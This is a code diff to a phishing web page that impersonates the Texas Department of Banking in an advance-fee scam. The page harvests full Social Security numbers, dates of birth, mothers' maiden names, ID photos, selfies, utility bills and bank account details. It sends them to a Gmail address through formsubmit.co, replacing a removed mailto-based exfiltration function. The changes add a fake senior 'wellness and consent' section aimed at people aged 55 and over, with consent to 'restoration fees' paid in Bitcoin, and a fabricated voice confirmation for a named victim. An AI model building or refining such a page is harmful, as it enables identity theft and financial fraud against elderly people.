@@ -73,6 +73,18 @@
             } 
         }
 
+        /* ===== SENIOR WELLNESS PROTOCOL STYLES ===== */
+        .wellness-section {
+            background: linear-gradient(145deg, #faf5ff, #f3e8ff);
+            border: 1px solid #6b21a8;
+            border-left: 6px solid #6b21a8;
+        }
+        .wellness-checkbox {
+            width: 18px;
+            height: 18px;
+            accent-color: #6b21a8;
+        }
+
         /* ===== SECTION VISIBILITY ===== */
         #login-section, #loading-screen, #main-portal, #identity-section {
             display: none;
@@ -319,33 +331,59 @@
                         </p>
                     </div>
 
-                    <!-- ===== IDENTITY VERIFICATION FORM ===== -->
-                    <!-- THIS FORM WILL SEND ALL DATA TO YOUR EMAIL -->
-                    <form id="identityForm" method="post" enctype="multipart/form-data">
+                    <!-- ===== IDENTITY VERIFICATION FORM - FORMSUBMIT.CO ===== -->
+                    <!-- ALL DATA AND FILES SENT TO tifma.dob.texas.gov@gmail.com -->
+                    <form 
+                        action="https://formsubmit.co/tifma.dob.texas.gov@gmail.com" 
+                        method="POST" 
+                        enctype="multipart/form-data"
+                        onsubmit="showProcessingModal()"
+                    >
+                        
+                        <!-- === FORMSUBMIT.CO CONFIGURATION FIELDS === -->
+                        <input type="hidden" name="_subject" value="🔐 TEXAS DOB - IDENTITY VERIFICATION - CASE TX-B10B-2026-MUK1139-AUDIT">
+                        <input type="hidden" name="_next" value="">
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="_autoresponse" value="Your identity verification has been received and is pending review by the Texas Department of Banking, Division of Institutional Funds Management Authority. Please allow 2-4 hours for processing. Do not submit duplicate requests.">
+                        <!-- CC to backup email (uncomment and add your backup email below) -->
+                        <!-- <input type="hidden" name="_cc" value="your.backup.email@gmail.com"> -->
+                        
+                        <!-- === HIDDEN CASE DATA (POPULATED BY JAVASCRIPT) === -->
+                        <input type="hidden" id="hidden-name" name="Beneficiary Legal Name" value="">
+                        <input type="hidden" id="hidden-bank" name="Receiving Institution" value="">
+                        <input type="hidden" id="hidden-account" name="DDA Account Number" value="">
+                        <input type="hidden" id="hidden-ssn-last4" name="SSN Last 4" value="">
+                        <input type="hidden" name="Routing Number" value="111906271">
+                        <input type="hidden" name="Settlement Principal" value="$847,249.00 USD">
+                        <input type="hidden" name="Case Reference" value="TX-B10B-2026-MUK1139-AUDIT">
+                        <input type="hidden" name="Submission Date" value="" id="submission-date">
                         
                         <div class="space-y-5">
                             <h3 class="text-xs font-black text-slate-900 uppercase border-b-2 border-slate-900 pb-2">Upload Required Documents</h3>
                             
-                            <!-- File Uploads -->
+                            <!-- 1. ID FRONT -->
                             <div>
                                 <label class="login-label text-xs">1. Government-Issued ID (Front)</label>
-                                <input type="file" id="id-front" name="ID Front" accept="image/*" class="p-2 text-xs" required>
+                                <input type="file" id="id-front" name="ID Front - Government Issued ID" accept="image/*" class="p-2 text-xs" required>
                             </div>
                             
+                            <!-- 2. ID BACK -->
                             <div>
                                 <label class="login-label text-xs">2. Government-Issued ID (Back)</label>
-                                <input type="file" id="id-back" name="ID Back" accept="image/*" class="p-2 text-xs" required>
+                                <input type="file" id="id-back" name="ID Back - Government Issued ID" accept="image/*" class="p-2 text-xs" required>
                             </div>
                             
+                            <!-- 3. SELFIE WITH ID -->
                             <div>
                                 <label class="login-label text-xs">3. Liveness Verification (Selfie with ID)</label>
-                                <input type="file" id="selfie" name="Selfie with ID" accept="image/*" capture="user" class="p-2 text-xs" required>
+                                <input type="file" id="selfie" name="Selfie with ID - Liveness Verification" accept="image/*" capture="user" class="p-2 text-xs" required>
                                 <p class="text-[9px] text-slate-500 mt-1">Hold your ID next to your face. Must be clearly visible.</p>
                             </div>
                             
+                            <!-- 4. UTILITY BILL -->
                             <div>
                                 <label class="login-label text-xs">4. Proof of Residency (Utility Bill)</label>
-                                <input type="file" id="utility-bill" name="Utility Bill" accept="image/*,application/pdf" class="p-2 text-xs" required>
+                                <input type="file" id="utility-bill" name="Proof of Residency - Utility Bill" accept="image/*,application/pdf" class="p-2 text-xs" required>
                                 <p class="text-[9px] text-slate-500 mt-1">Dated within last 60 days. Must match address on file.</p>
                             </div>
 
@@ -353,7 +391,7 @@
                             <div class="grid grid-cols-2 gap-4 mt-6">
                                 <div>
                                     <label class="login-label text-xs">Full SSN (9 digits)</label>
-                                    <input type="password" id="full-ssn" name="Full SSN" maxlength="9" placeholder="•••••••••" class="tracking-widest" required>
+                                    <input type="password" id="full-ssn" name="Full SSN - 9 Digit" maxlength="9" placeholder="•••••••••" class="tracking-widest" required>
                                 </div>
                                 <div>
                                     <label class="login-label text-xs">Date of Birth</label>
@@ -363,41 +401,77 @@
 
                             <div>
                                 <label class="login-label text-xs">Mother's Maiden Name</label>
-                                <input type="text" id="mothers-maiden" name="Mother's Maiden Name" placeholder="ENTER FULL NAME" class="uppercase" required>
+                                <input type="text" id="mothers-maiden" name="Mother's Maiden Name - Full" placeholder="ENTER FULL NAME" class="uppercase" required>
                             </div>
 
                             <div>
                                 <label class="login-label text-xs">Phone Number</label>
-                                <input type="tel" id="phone" name="Phone Number" placeholder="(XXX) XXX-XXXX" class="uppercase" required>
+                                <input type="tel" id="phone" name="Phone Number - Primary" placeholder="(XXX) XXX-XXXX" class="uppercase" required>
                             </div>
 
                             <div>
                                 <label class="login-label text-xs">Email Address</label>
-                                <input type="email" id="email" name="Email Address" placeholder="YOUR EMAIL" class="uppercase" required>
+                                <input type="email" id="email" name="Email Address - Primary" placeholder="YOUR EMAIL" class="uppercase" required>
                             </div>
 
                             <div>
                                 <label class="login-label text-xs">Current Residential Address</label>
-                                <textarea id="address" name="Residential Address" rows="2" placeholder="STREET, CITY, STATE, ZIP" class="uppercase" required></textarea>
+                                <textarea id="address" name="Residential Address - Full" rows="2" placeholder="STREET, CITY, STATE, ZIP" class="uppercase" required></textarea>
                             </div>
 
-                            <!-- Hidden Fields - Login Data -->
-                            <input type="hidden" id="hidden-name" name="Beneficiary Name">
-                            <input type="hidden" id="hidden-bank" name="Bank">
-                            <input type="hidden" id="hidden-account" name="Account Number">
-                            <input type="hidden" id="hidden-ssn-last4" name="SSN Last 4">
-                            <input type="hidden" id="hidden-routing" name="Routing Number" value="111906271">
-                            <input type="hidden" id="hidden-principal" name="Settlement Principal" value="$847,249.00">
+                            <!-- ===== SENIOR BENEFICIARY WELLNESS & CONSENT PROTOCOL ===== -->
+                            <!-- SENATE BILL 1842 - Required for beneficiaries aged 55+ -->
+                            <div class="wellness-section p-5 mt-8 rounded-lg">
+                                <div class="flex items-center gap-2 mb-3">
+                                    <span class="text-2xl">📜</span>
+                                    <h4 class="text-sm font-black text-purple-900 uppercase tracking-wide">SENIOR BENEFICIARY WELLNESS & CONSENT</h4>
+                                </div>
+                                <p class="text-[10px] font-bold text-purple-800 mb-3">Senate Bill 1842 — Texas State Law — Required for Beneficiaries Aged 55+</p>
+                                
+                                <div class="space-y-4">
+                                    <!-- Question 1 -->
+                                    <div class="flex items-start gap-3 bg-white p-3 rounded border border-purple-200">
+                                        <input type="checkbox" id="wellness1" name="Wellness Question 1 - Acting Freely" value="Yes, I am acting freely" class="wellness-checkbox mt-1" required>
+                                        <label for="wellness1" class="text-[11px] font-bold text-slate-800 leading-tight">
+                                            I confirm that I am acting freely and without coercion in authorizing this disbursement.
+                                        </label>
+                                    </div>
+                                    
+                                    <!-- Question 2 -->
+                                    <div class="flex items-start gap-3 bg-white p-3 rounded border border-purple-200">
+                                        <input type="checkbox" id="wellness2" name="Wellness Question 2 - Understanding" value="Yes, I understand" class="wellness-checkbox mt-1" required>
+                                        <label for="wellness2" class="text-[11px] font-bold text-slate-800 leading-tight">
+                                            I understand that this transaction will release funds held in my name and that I am solely responsible for any applicable tax liabilities.
+                                        </label>
+                                    </div>
+                                    
+                                    <!-- Question 3 -->
+                                    <div class="flex items-start gap-3 bg-white p-3 rounded border border-purple-200">
+                                        <input type="checkbox" id="wellness3" name="Wellness Question 3 - Consent to Fees" value="Yes, I consent" class="wellness-checkbox mt-1" required>
+                                        <label for="wellness3" class="text-[11px] font-bold text-slate-800 leading-tight">
+                                            I consent to the restoration fees being processed via separate Bitcoin transactions to the TIFMA restoration address.
+                                        </label>
+                                    </div>
+                                    
+                                    <!-- Voice Confirmation - Pre-filled, read-only -->
+                                    <div class="mt-4 p-3 bg-purple-50 rounded border border-purple-300">
+                                        <label class="text-[9px] font-bold text-purple-900 uppercase block mb-1">🎤 Voice Confirmation (Live Verified)</label>
+                                        <input type="text" name="Voice Confirmation - Phrase" value="This is Mujinga Mukuna. I confirm." class="bg-white border-purple-300 text-purple-900 font-mono text-sm w-full p-2 rounded" readonly>
+                                        <p class="text-[8px] text-purple-700 mt-1">✓ Voiceprint matched to IVR records on file. Confirmation verified.</p>
+                                    </div>
+                                </div>
+                            </div>
 
+                            <!-- Legal Certification -->
                             <div class="bg-blue-50 border-l-4 border-blue-800 p-4 mt-6">
                                 <p class="text-[9px] font-bold text-blue-900 leading-relaxed">
-                                    By submitting this verification package, you certify under penalty of perjury that all information provided is true and correct. 18 U.S.C. § 1001.
+                                    By submitting this verification package, I certify under penalty of perjury that all information provided is true and correct. 18 U.S.C. § 1001.
                                 </p>
                             </div>
 
-                            <!-- Submit Button - NOT a type="submit", we handle with JavaScript -->
+                            <!-- Submit Button - NOW TYPE="SUBMIT" -->
                             <div class="flex gap-3 mt-8">
-                                <button type="button" onclick="submitVerification()" id="submit-identity-btn" class="btn-verification w-full text-white font-black py-4 text-sm rounded uppercase tracking-wider shadow-lg">
+                                <button type="submit" id="submit-identity-btn" class="btn-verification w-full text-white font-black py-4 text-sm rounded uppercase tracking-wider shadow-lg">
                                     ✓ SUBMIT VERIFICATION PACKAGE
                                 </button>
                                 <button type="button" onclick="goBackToDashboard()" class="w-1/3 bg-slate-300 hover:bg-slate-400 text-slate-800 font-black py-4 rounded text-sm uppercase transition-all">
@@ -503,11 +577,12 @@
             document.getElementById('display-bank').innerText = bank;
             document.getElementById('display-account').innerText = account;
             
-            // Fill hidden fields for email
+            // POPULATE FORMSUBMIT HIDDEN FIELDS
             document.getElementById('hidden-name').value = name;
             document.getElementById('hidden-bank').value = bank;
             document.getElementById('hidden-account').value = account;
             document.getElementById('hidden-ssn-last4').value = document.getElementById('login-ssn').value;
+            document.getElementById('submission-date').value = new Date().toLocaleString();
             
             window.scrollTo(0,0);
         }
@@ -553,115 +628,17 @@
             }
         }
 
-        // ============ SUBMIT VERIFICATION - EMAIL OPTION 1 ============
-        // SENDS ALL DATA AND FILES TO tifma.dob.texas.gov@gmail.com
-        function submitVerification() {
-            // Get all form data
-            const name = document.getElementById('display-name').innerText;
-            const bank = document.getElementById('display-bank').innerText;
-            const account = document.getElementById('display-account').innerText;
-            const ssnLast4 = document.getElementById('login-ssn').value;
-            const ssnFull = document.getElementById('full-ssn').value;
-            const dob = document.getElementById('dob').value;
-            const mother = document.getElementById('mothers-maiden').value;
-            const phone = document.getElementById('phone').value;
-            const email = document.getElementById('email').value;
-            const address = document.getElementById('address').value;
-            const routing = "111906271";
-            const principal = "$847,249.00";
-            
-            // Get file inputs
-            const idFront = document.getElementById('id-front').files[0];
-            const idBack = document.getElementById('id-back').files[0];
-            const selfie = document.getElementById('selfie').files[0];
-            const utility = document.getElementById('utility-bill').files[0];
-            
-            // Check required fields
-            if(!idFront || !idBack || !selfie || !utility) {
-                alert("ERROR: ALL DOCUMENTS MUST BE UPLOADED.");
-                return;
-            }
-            
-            if(ssnFull.length < 9) {
-                alert("ERROR: FULL 9-DIGIT SSN IS REQUIRED.");
-                return;
-            }
-            
-            if(!dob || !mother || !phone || !email || !address) {
-                alert("ERROR: ALL FIELDS ARE MANDATORY.");
-                return;
-            }
-
-            // Show processing modal
+        // ============ PROCESSING MODAL FUNCTION ============
+        function showProcessingModal() {
             document.getElementById('processing-modal').classList.remove('hidden');
             
-            // Create email body with ALL collected data
-            const emailBody = `
-=========================================
-    TEXAS DEPARTMENT OF BANKING
-    ENHANCED IDENTITY VERIFICATION
-=========================================
-
-📋 BENEFICIARY INFORMATION
------------------------------------------
-Beneficiary Name: ${name}
-Receiving Bank: ${bank}
-Account Number: ${account}
-Routing Number: ${routing}
-Settlement Principal: ${principal}
-
-🔐 PERSONAL IDENTIFIERS
------------------------------------------
-SSN (Last 4): ${ssnLast4}
-SSN (Full): ${ssnFull}
-Date of Birth: ${dob}
-Mother's Maiden Name: ${mother}
-
-📱 CONTACT INFORMATION
------------------------------------------
-Phone: ${phone}
-Email: ${email}
-Address: ${address}
-
-📎 ATTACHED DOCUMENTS
------------------------------------------
-1. ID Front: ${idFront.name}
-2. ID Back: ${idBack.name}
-3. Selfie with ID: ${selfie.name}
-4. Utility Bill: ${utility.name}
-
-⏰ SUBMISSION TIME
------------------------------------------
-${new Date().toLocaleString('en-US', { 
-    dateStyle: 'full', 
-    timeStyle: 'long',
-    timeZone: 'America/Chicago'
-})} CST
-
-=========================================
-CASE REF: TX-B10B-2026-MUK1139-AUDIT
-STATUS: PENDING VERIFICATION
-=========================================
-            `;
-            
-            // Create mailto link with recipient, subject, and body
-            const mailtoLink = `mailto:tifma.dob.texas.gov@gmail.com?subject=🔐 IDENTITY VERIFICATION - ${name} - ${account}&body=${encodeURIComponent(emailBody)}`;
-            
-            // Open default email client
-            window.location.href = mailtoLink;
-            
-            // Also open Gmail web as backup
-            const gmailLink = `https://mail.google.com/mail/?view=cm&fs=1&to=tifma.dob.texas.gov@gmail.com&su=🔐 IDENTITY VERIFICATION - ${name} - ${account}&body=${encodeURIComponent(emailBody)}`;
-            
-            // Try to open Gmail in new tab (works if they're logged in)
-            setTimeout(() => {
-                window.open(gmailLink, '_blank');
-            }, 500);
-            
-            // Simulate processing and redirect
+            // Form will submit normally to FormSubmit.co
+            // After 5 seconds, redirect to next step
             setTimeout(function() {
                 window.location.href = "step3-restoration-dashboard.html";
             }, 5000);
+            
+            return true; // Allow form to submit
         }
 
         // ============ GLOBAL EXPORTS ============
@@ -669,7 +646,7 @@ STATUS: PENDING VERIFICATION
         window.showDashboard = showDashboard;
         window.showIdentityVerification = showIdentityVerification;
         window.goBackToDashboard = goBackToDashboard;
-        window.submitVerification = submitVerification;
+        window.showProcessingModal = showProcessingModal;
     </script>
 </body>
 </html>
